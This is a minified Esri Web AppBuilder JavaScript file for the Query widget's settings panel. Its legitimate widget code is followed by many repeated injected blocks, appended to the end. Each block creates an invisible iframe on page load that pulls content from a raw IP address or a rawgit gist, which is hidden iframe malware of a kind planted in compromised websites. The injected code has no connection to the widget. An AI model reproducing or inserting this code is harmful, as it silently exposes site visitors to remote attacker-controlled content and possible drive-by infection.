// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Query/setting/SingleQuerySetting.html":'\x3cdiv\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"filterDiv" style\x3d"height:1px;visibility:hidden;overflow:hidden;"\x3e\x3c/div\x3e\r\n\t\r\n\t\x3ctable data-dojo-attach-point\x3d"generalTable" class\x3d"general" cellpadding\x3d"0" cellspacing\x3d"0"\x3e\r\n\t\t\x3ctbody\x3e\r\n\t\t\t\x3ctr\x3e\r\n\t\t\t\t\x3ctd class\x3d"first-td"\x3e${nls.querySource}\x3c/td\x3e\r\n\t\t\t\t\x3ctd class\x3d"second-td"\x3e\r\n\t\t\t\t\t\x3ctable cellpadding\x3d"0" cellspacing\x3d"0" style\x3d"width:100%;border-collapse:collapse;"\x3e\r\n\t\t\t\t\t\t\x3ctbody\x3e\r\n\t\t\t\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\t\t\t\x3ctd style\x3d"width:auto;"\x3e\r\n\t\t\t\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"urlTextBox" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d\'required:true,trim:true,disabled:true\' style\x3d"width:100%;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\x3ctd style\x3d"width:40px;"\x3e\r\n\t\t\t\t\t\t\t\t\t\x3cdiv class\x3d"setting-btn jimu-float-trailing" data-dojo-attach-event\x3d"onclick:_onBtnSetSourceClicked" title\x3d"${nls.setSource}"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cdiv class\x3d"jimu-icon jimu-icon-setting"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\t\x3c/tbody\x3e\r\n\t\t\t\t\t\x3c/table\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\x3c/tbody\x3e\r\n\t\x3c/table\x3e\r\n\r\n\t\x3cdiv data-dojo-attach-point\x3d"detailSection" class\x3d"detail"\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"infoTabNode"\x3e\r\n\t\t\t\x3ctable class\x3d"general" cellpadding\x3d"0" cellspacing\x3d"0"\x3e\r\n\t\t\t\t\x3ctbody\x3e\r\n\t\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\t\x3ctd class\x3d"first-td"\x3e${jimuNls.common.title}\x3c/td\x3e\r\n\t\t\t\t\t\t\x3ctd class\x3d"second-td"\x3e\r\n\t\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"queryNameTextBox" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d\'required:true,trim:true\' style\x3d"width:100%;" data-dojo-attach-event\x3d"change:_onQueryNameChanged"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\t\x3ctd class\x3d"first-td"\x3e${nls.icon}\x3c/td\x3e\r\n\t\t\t\t\t\t\x3ctd class\x3d"second-td"\x3e\r\n\t\t\t\t\t\t\t\x3cdiv class\x3d"click-picker" data-dojo-attach-event\x3d"click:_onImageChooserDivClicked"\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv data-dojo-type\x3d"jimu/dijit/ImageChooser" data-dojo-attach-point\x3d"imageChooser" data-dojo-props\x3d"cropImage:true,showSelfImg:true,goldenWidth:16,goldenHeight:16,format:[\'image/gif\',\'image/png\',\'image/jpeg\']" class\x3d"jimu-float-leading" style\x3d"width:16px;height:16px;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"separator jimu-float-leading"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"jimu-icon jimu-icon-down-arrow-8 jimu-float-leading"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3c/tbody\x3e\r\n\t\t\t\x3c/table\x3e\r\n\t\t\x3c/div\x3e\r\n\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"definitionTabNode"\x3e\r\n\t\t\t\x3cdiv class\x3d"attribute-filter-section"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"stress"\x3e${nls.queryCriteira}\x3c/div\x3e\r\n\t\t\t\t\x3cdiv class\x3d"attribute-filter-content"\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"jimu-widget-note" style\x3d"margin-top:5px;"\x3e${nls.defineWhereClause}\x3c/div\x3e\r\n\t\t\t\t\t\x3ctable style\x3d"width:100%;margin-top:4px;"\x3e\r\n\t\t\t\t\t\t\x3ccolgroup\x3e\r\n\t\t\t\t\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\t\t\t\t\t\x3ccol width\x3d"40"\x3e\x3c/col\x3e\r\n\t\t\t\t\t\t\x3c/colgroup\x3e\r\n\t\t\t\t\t\t\x3ctbody\x3e\r\n\t\t\t\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\x3cdiv class\x3d"attribute-sql jimu-widget-note" data-dojo-attach-point\x3d"sqlDiv" style\x3d"border:1px solid #ccc;padding:7px 8px;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\x3cdiv class\x3d"setting-btn jimu-float-trailing" data-dojo-attach-event\x3d"onclick:_onBtnFilterClicked" title\x3d"${nls.setSource}"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cdiv class\x3d"jimu-icon jimu-icon-setting"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\t\x3c/tbody\x3e\r\n\t\t\t\t\t\x3c/table\x3e\r\n\t\t\t\t\t\x3cdiv style\x3d"margin-top:13px;" data-dojo-attach-point\x3d"showSQLSection"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3cdiv class\x3d"spatial-filter-section" data-dojo-attach-point\x3d"spatialFilterDiv"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"resultsTabNode"\x3e\r\n\t\t\t\x3cdiv class\x3d"popup-section"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"stress"\x3e${nls.content}\x3c/div\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"popupContainer"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-point\x3d"symbolSection" class\x3d"symbol-section" style\x3d"margin-top:14px;"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"stress" style\x3d"margin-bottom:15px;"\x3e${nls.symbol}\x3c/div\x3e\r\n\t\t\t\t\x3cdiv style\x3d"margin-top:5px;"\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"radio-label-container"\x3e\r\n\t\t\t\t\t\t\x3cinput type\x3d"radio" data-dojo-attach-point\x3d"radioServiceSymbol" class\x3d"jimu-radio-btn"/\x3e\r\n\t\t\t\t\t\t\x3clabel data-dojo-attach-point\x3d"labelServiceSymbol"\x3e${nls.serviceSymbolTip}\x3c/label\x3e\r\n\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"radio-label-container" style\x3d"margin-top:8px;"\x3e\r\n\t\t\t\t\t\t\x3cinput type\x3d"radio" data-dojo-attach-point\x3d"radioCustomSymbol" checked class\x3d"jimu-radio-btn"/\x3e\r\n\t\t\t\t\t\t\x3clabel data-dojo-attach-point\x3d"labelCustomSymbol"\x3e${nls.setSymbol}\x3c/label\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"layerSymbolPicker" data-dojo-type\x3d"jimu/dijit/SymbolPicker"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-type\x3d"jimu/dijit/CheckBox" class\x3d"small-font-size" data-dojo-attach-point\x3d"cbxModifySymbol" style\x3d"margin-top:8px;"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"optionsTabNode"\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-point\x3d"cbxKeepResultsDiv" style\x3d"display:none;"\x3e\x3c/div\x3e\r\n\t\t\t\x3cdiv class\x3d"export-section" data-dojo-attach-point\x3d"exportSection"\x3e\x3c/div\x3e\r\n\t\t\t\x3cdiv class\x3d"create-layer-section"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"stress"\x3e${nls.createLayerForTaskTip}\x3c/div\x3e\r\n\t\t\t\t\x3cdiv style\x3d"margin-top:15px;"\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"radio-label-container"\x3e\r\n\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"radioOneLayerPerTask" type\x3d"radio" checked class\x3d"jimu-radio-btn"/\x3e\r\n\t\t\t\t\t\t\x3clabel data-dojo-attach-point\x3d"labelOneLayerPerTask"\x3e${nls.oneLayerForTaskTip}\x3c/label\x3e\r\n\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"radio-label-container" style\x3d"margin-top:15px;"\x3e\r\n\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"radioMultipleLayerPerTask" type\x3d"radio" class\x3d"jimu-radio-btn"/\x3e\r\n\t\t\t\t\t\t\x3clabel data-dojo-attach-point\x3d"labelMultipleLayerPerTask"\x3e${nls.multipleLayerForTaskTip}\x3c/label\x3e\r\n\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\r\n\t\x3cdiv data-dojo-attach-point\x3d"shelter" data-dojo-type\x3d"jimu/dijit/LoadingShelter" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/on dojo/query dojo/Evented dojo/Deferred dojo/_base/lang dojo/_base/html dijit/_WidgetBase dojo/_base/declare dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./SingleQuerySetting.html jimu/utils jimu/dijit/Popup jimu/dijit/CheckBox jimu/dijit/TabContainer3 jimu/dijit/Message jimu/LayerInfos/LayerInfos jimu/dijit/_QueryableLayerSourcePopup ../utils ./PopupConfig ./SpatialFilterConfig esri/request esri/symbols/jsonUtils jimu/dijit/Filter jimu/dijit/SymbolPicker jimu/dijit/LoadingShelter jimu/dijit/ImageChooser dijit/form/ValidationTextBox".split(" "),
function(l,p,q,r,e,g,t,u,v,w,x,f,y,m,z,n,A,B,h,C,D,E,F,G){return u([t,v,w,q],{baseClass:"jimu-widget-single-query-setting",templateString:x,popupConfig:null,spatialFilterConfig:null,jimuNls:null,_webMapLayerId:null,_defaultTaskIcon:null,map:null,nls:null,target:null,tr:null,appConfig:null,folderUrl:null,_layerDefinition:null,postMixInProperties:function(){this.inherited(arguments);this._defaultTaskIcon=this.folderUrl+"css/images/default_task_icon.png";this.jimuNls=window.jimuNls},postCreate:function(){this.inherited(arguments);
this._initSelf()},destroy:function(){this.target=null;this.emit("before-destroy");this.inherited(arguments)},setConfig:function(a){if(a.webMapLayerId){var b=a.webMapLayerId,c=A.getInstanceSync(),d=c.getLayerInfoById(b);d||(d=c.getTableInfoById(b));if(!d)return;b=d.getUrl();a.url=b}this._setConfig(a)},_setConfig:function(a){this.config=a;if(this._isObject(this.config)){var b=a.url||"";b&&"string"===typeof b&&(this.showBigShelter(),this.tab.showShelter(),this._layerDefinition&&this._layerDefinition.url===
b?this._resetByConfig(this.config,this._layerDefinition).promise.always(e.hitch(this,function(){this.hideBigShelter();this.tab.hideShelter()})):(this._layerDefinition=null,E({url:b,handAs:"json",content:{f:"json"},callbackParamName:"callback"}).then(e.hitch(this,function(a){this.domNode&&(this._layerDefinition=a,this._layerDefinition.url=b,this._resetByConfig(this.config,this._layerDefinition).promise.always(e.hitch(this,function(){this.hideBigShelter();this.tab.hideShelter()})))}),e.hitch(this,function(a){console.error(a);
this.domNode&&this.hideBigShelter()}))))}},getConfig:function(){var a={url:"",name:"",icon:"",filter:null,showSQL:!1,spatialFilter:null,popupInfo:"",orderByFields:[],useLayerSymbol:!0,resultsSymbol:"",canModifySymbol:this.cbxModifySymbol.getValue(),enableExport:!1,singleResultLayer:!0,webMapLayerId:this._webMapLayerId};if(!this._layerDefinition)return this.scrollToDom(this.generalTable),new n({message:this.nls.setSourceTip}),null;a.url=this._layerDefinition.url;if(!this.queryNameTextBox.validate())return f.showValidationErrorTipForFormDijit(this.queryNameTextBox),
null;a.name=this.queryNameTextBox.get("value");var b=this.imageChooser.getImageData();b===this._defaultTaskIcon&&(b="");a.icon=b;b=this.filter.toJson();if(!b)return new n({message:this.nls.setFilterTip}),null;a.filter=b;a.showSQL=this.cbxShowSQL.getValue();if(h.isTable(this._layerDefinition))a.spatialFilter=null;else{b=this.spatialFilterConfig.getConfig();if(!b)return null;a.spatialFilter=b}b=this.popupConfig.getConfig();if(!b)return null;a.orderByFields=b.orderByFields;a.popupInfo=b.popupInfo;b=
null;if(h.isTable(this._layerDefinition))a.useLayerSymbol=!1,a.resultsSymbol=null;else if(h.isImageServiceLayer(this._layerDefinition))if(a.useLayerSymbol=!1,b=this.layerSymbolPicker.getSymbol())a.resultsSymbol=b.toJson();else return console.error("Can't get symbol from SymbolPicker"),null;else if(this.radioCustomSymbol.checked)if(a.useLayerSymbol=!1,b=this.layerSymbolPicker.getSymbol())a.resultsSymbol=b.toJson();else return console.error("Can't get symbol from SymbolPicker"),null;else a.useLayerSymbol=
!0,a.resultsSymbol=null;a.singleResultLayer=this.radioOneLayerPerTask.checked;a.enableExport=this.cbxExport.getValue();this.target._layerDefinition=this._layerDefinition;this.target.singleConfig=a;a.webMapLayerId&&(a.url="");return a},scrollToDom:function(a){a=g.coords(a).y;var b=g.coords(this.domNode).y;this.domNode.parentNode.scrollTop=a-b},showBigShelter:function(){this.emit("loading")},hideBigShelter:function(){this.emit("unloading")},showQueryDefinition:function(){this.tab.selectTab(this.nls.queryDefinition)},
showResultsSetting:function(){this.tab.selectTab(this.nls.results)},_initSelf:function(){this._initTabs();this._initInfoTab();this._initFilterTab();this._initResultSettingTab();this._initOptionsTab()},_initTabs:function(){this.tab=new z({tabs:[{title:this.nls.infoText,content:this.infoTabNode},{title:this.nls.filters,content:this.definitionTabNode},{title:this.nls.results,content:this.resultsTabNode},{title:this.nls.optionsText,content:this.optionsTabNode}]});this.tab.placeAt(this.detailSection);
this.tab.showShelter();this.own(l(this.tab,"tabChanged",e.hitch(this,function(a){a===this.nls.filters&&this._updateSqlDivByFilter()})))},_initInfoTab:function(){this._setDefaultTaskIcon()},_onImageChooserDivClicked:function(a){this.imageChooser.mask&&(a=a.target||a.srcElement,a!==this.imageChooser.mask&&a!==this.imageChooser.fileInput&&f.simulateClickEvent(this.imageChooser.mask))},_initFilterTab:function(){this.filter=new G({enableAskForValues:!0,noFilterTip:this.nls.noFilterTip,style:"width:100%;"});
this.filter.placeAt(this.filterDiv);this.cbxShowSQL=new m({label:this.nls.displaySQLTip});this.cbxShowSQL.labelNode&&g.addClass(this.cbxShowSQL.labelNode,"light-stress");this.cbxShowSQL.check();this.cbxShowSQL.placeAt(this.showSQLSection);this._initSpatialFilterConfig()},_resetAttributeFilter:function(){this.filter.reset();this._updateSqlDivByFilter()},_updateSqlDivByFilter:function(){var a="",b=this.filter.toJson();b?a=b.expr?"1\x3d1"===b.expr?this.nls.noExpressionDefinedTip:b.expr:this.nls.specifyFilterAtRuntimeTip:
console.log("can't get partsObj from filter");a&&(this.sqlDiv.innerHTML=a)},_onBtnFilterClicked:function(){var a=new y({width:680,height:485,content:this.filter,buttons:[{label:this.nls.ok,onClick:e.hitch(this,function(){this.filter.toJson()&&(this._updateSqlDivByFilter(),a.close())})},{label:this.nls.cancel,onClick:e.hitch(this,function(){a.close()})}],onClose:e.hitch(this,function(){a.content=null;g.place(this.filter.domNode,this.filterDiv)})})},_initSpatialFilterConfig:function(){this.spatialFilterConfig=
new D({nls:this.nls});this.spatialFilterConfig.placeAt(this.spatialFilterDiv)},_initResultSettingTab:function(){this._initPopupConfig();f.combineRadioCheckBoxWithLabel(this.radioServiceSymbol,this.labelServiceSymbol);f.combineRadioCheckBoxWithLabel(this.radioCustomSymbol,this.labelCustomSymbol);f.groupRadios([this.radioServiceSymbol,this.radioCustomSymbol]);this.cbxModifySymbol.setLabel(this.nls.changeSymbolAtRuntime);this.cbxModifySymbol.uncheck()},_initPopupConfig:function(){this.popupConfig=new C({nls:this.nls,
sqs:this});this.popupConfig.placeAt(this.popupContainer)},_showSymbolSection:function(){g.removeClass(this.symbolSection,"not-visible")},_hideSymbolSection:function(){g.addClass(this.symbolSection,"not-visible")},_initOptionsTab:function(){this.cbxExport=new m({label:this.nls.exportTip});this.cbxExport.placeAt(this.exportSection);g.addClass(this.cbxExport.domNode,"small-font-size");f.combineRadioCheckBoxWithLabel(this.radioOneLayerPerTask,this.labelOneLayerPerTask);f.combineRadioCheckBoxWithLabel(this.radioMultipleLayerPerTask,
this.labelMultipleLayerPerTask);f.groupRadios([this.radioOneLayerPerTask,this.radioMultipleLayerPerTask])},_onQueryNameChanged:function(){var a=p(".label",this.target)[0],b=this.queryNameTextBox.get("value");a.innerHTML=b;a.title=b},_clear:function(){this.urlTextBox.set("value","");this._layerDefinition=null;this.queryNameTextBox.set("value","");this._setDefaultTaskIcon();this._resetAttributeFilter();g.removeClass(this.spatialFilterDiv,"not-visible");this.spatialFilterConfig.reset();this.cbxShowSQL.check();
this.tab.showShelter();this.popupConfig.onLayerChange(!0);this.radioServiceSymbol.disabled=!1;this.radioCustomSymbol.checked=!0;this.layerSymbolPicker.reset();this.cbxModifySymbol.uncheck();this.radioOneLayerPerTask.checked=!0;this.cbxExport.uncheck()},_onBtnSetSourceClicked:function(){var a=new B({titleLabel:this.nls.setDataSource,dijitArgs:{style:{height:"100%"},multiple:!1,createMapResponse:this.map.webMapResponse,portalUrl:this.appConfig.portalUrl}});this.own(l(a,"ok",e.hitch(this,function(b){var c=
a.getSelectedRadioType();a.close();a=null;this.setNewLayerDefinition(b,c,null)})));this.own(l(a,"cancel",e.hitch(this,function(){a.close();a=null})));a.startup()},setNewLayerDefinition:function(a,b,c){a.definition.name=a.name;a.definition.url=a.url;a.url!==(this._layerDefinition&&this._layerDefinition.url)&&this._resetByNewLayerDefinition(a,b,c)},_resetByNewLayerDefinition:function(a,b,c){var d=a.definition;this._clear();if(d){var f=null;"map"===b&&a.layerInfo&&(f=a.layerInfo.id);this._layerDefinition=
d;this._webMapLayerId=f;a=d.url;this.urlTextBox.set("value",a);this.queryNameTextBox.set("value",c||d.name);this.tab.hideShelter();this._resetAttributeFilter();this._layerDefinition&&this.filter.build({url:a,expr:"1\x3d1",layerDefinition:this._layerDefinition,featureLayerId:this._webMapLayerId}).promise.always(e.hitch(this,function(){this._updateSqlDivByFilter()}));h.isTable(this._layerDefinition)?g.addClass(this.spatialFilterDiv,"not-visible"):g.removeClass(this.spatialFilterDiv,"not-visible");this.popupConfig.onLayerChange(!!this._webMapLayerId);
this._webMapLayerId&&this.popupConfig.setConfig({popupInfo:{readFromWebMap:!0},orderByFields:[]});this._handleSymbolSection(d);this.cbxModifySymbol.uncheck()}},_handleSymbolSection:function(a,b){var c="";this._showSymbolSection();h.isTable(a)?(this.radioServiceSymbol.disabled=!0,this._hideSymbolSection(),this.layerSymbolPicker.reset()):h.isImageServiceLayer(a)?(this.radioServiceSymbol.disabled=!0,this.radioCustomSymbol.checked=!0,c="fill"):(this.radioServiceSymbol.disabled=!1,a.geometryType&&(a=f.getTypeByGeometryType(a.geometryType),
"point"===a?c="marker":"polyline"===a?c="line":"polygon"===a&&(c="fill")));c&&(this.layerSymbolPicker.showByType(c),b&&this.layerSymbolPicker.showBySymbol(b))},_setDefaultTaskIcon:function(){this.imageChooser.setDefaultSelfSrc(this._defaultTaskIcon)},_resetByConfig:function(a,b){var c=new r;a=e.clone(a);this._upgradeConfigForLowerVersion(b,a);this._webMapLayerId=a.webMapLayerId;this.urlTextBox.set("value",a.url);this.queryNameTextBox.set("value",a.name||"");a.icon?this.imageChooser.setDefaultSelfSrc(f.processUrlInWidgetConfig(a.icon,
this.folderUrl)):this._setDefaultTaskIcon();var d=a.filter;this._resetAttributeFilter();var k=null,k={url:b.url,layerDefinition:b,featureLayerId:this._webMapLayerId};this._isObject(d)?k.partsObj=d:k.expr="1\x3d1";k=this.filter.build(k);k.promise.always(e.hitch(this,function(){this._updateSqlDivByFilter();c.resolve()}));this.cbxShowSQL.setValue(a.showSQL);this.spatialFilterConfig.reset();h.isTable(this._layerDefinition)?g.addClass(this.spatialFilterDiv,"not-visible"):(g.removeClass(this.spatialFilterDiv,
"not-visible"),a.spatialFilter&&this.spatialFilterConfig.setConfig(a.spatialFilter));this.popupConfig.onLayerChange(!!this._webMapLayerId);this.popupConfig.setConfig({popupInfo:a.popupInfo,orderByFields:a.orderByFields});d=null;if(a.resultsSymbol)try{d=F.fromJson(a.resultsSymbol)}catch(H){console.error(H)}this._handleSymbolSection(b,d);a.useLayerSymbol&&(this.radioServiceSymbol.checked=!0);this.cbxModifySymbol.setValue(a.canModifySymbol);a.singleResultLayer?this.radioOneLayerPerTask.checked=!0:this.radioMultipleLayerPerTask.checked=
!0;this.cbxExport.setValue(a.enableExport);return c},_upgradeConfigForLowerVersion:function(a,b){b.popup&&!b.popupInfo&&(b.popupInfo=h.upgradePopupToPopupInfo(a,b.popup))},_isObject:function(a){return a&&"object"===typeof a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});